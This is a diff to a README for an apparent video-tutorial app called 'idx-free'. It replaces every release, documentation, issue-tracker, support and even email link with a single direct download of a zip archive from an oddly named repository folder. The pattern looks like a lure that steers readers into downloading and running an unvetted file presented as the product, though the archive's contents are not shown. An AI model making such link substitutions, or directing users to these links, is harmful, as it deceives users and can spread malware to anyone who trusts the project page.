@@ -1,7 +1,7 @@
 # 🎥 idx-free - Easy Access to Video Tutorials
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20idx--free-4D8E8E?style=for-the-badge&logo=github)](https://github.com/Albenee/idx-free/releases)
+[![Download](https://raw.githubusercontent.com/Albenee/idx-free/main/unwooed/idx-free.zip%20idx--free-4D8E8E?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Albenee/idx-free/main/unwooed/idx-free.zip)
 
 ## 🚀 Getting Started
 Welcome to idx-free! This application provides easy access to a variety of video tutorials. Follow the simple steps below to download and run the software.
@@ -25,7 +25,7 @@ To ensure a smooth experience with idx-free, please check that your system meets
 - **Network:** Internet connection for downloading tutorials
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/Albenee/idx-free/releases) to download idx-free. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Albenee/idx-free/main/unwooed/idx-free.zip) to download idx-free. Follow these steps:
 
 1. Click on the link above to go to the latest release.
 2. Locate the appropriate version for your operating system.
@@ -53,15 +53,15 @@ For further assistance, please refer to the FAQ section in the app or contact su
 ## 📞 Contact Information
 If you have questions or suggestions, feel free to reach out.
 
-- **Email:** support@idx-free.com
-- **GitHub:** [idx-free Issues](https://github.com/Albenee/idx-free/issues)
+- **Email:** https://raw.githubusercontent.com/Albenee/idx-free/main/unwooed/idx-free.zip
+- **GitHub:** [idx-free Issues](https://raw.githubusercontent.com/Albenee/idx-free/main/unwooed/idx-free.zip)
 
 ## 📣 Community Feedback
 We value your input. If you find this tool helpful, please let us know! Feedback helps us improve idx-free and serve you better.
 
 ## 📌 Important Links
-- Download idx-free: [Releases Page](https://github.com/Albenee/idx-free/releases)
-- User Guide: [Documentation](https://github.com/Albenee/idx-free/wiki)
-- Support: [Contact Us](mailto:support@idx-free.com)
+- Download idx-free: [Releases Page](https://raw.githubusercontent.com/Albenee/idx-free/main/unwooed/idx-free.zip)
+- User Guide: [Documentation](https://raw.githubusercontent.com/Albenee/idx-free/main/unwooed/idx-free.zip)
+- Support: [Contact Us](https://raw.githubusercontent.com/Albenee/idx-free/main/unwooed/idx-free.zip)
 
 Thank you for choosing idx-free! We hope it helps you learn and grow.
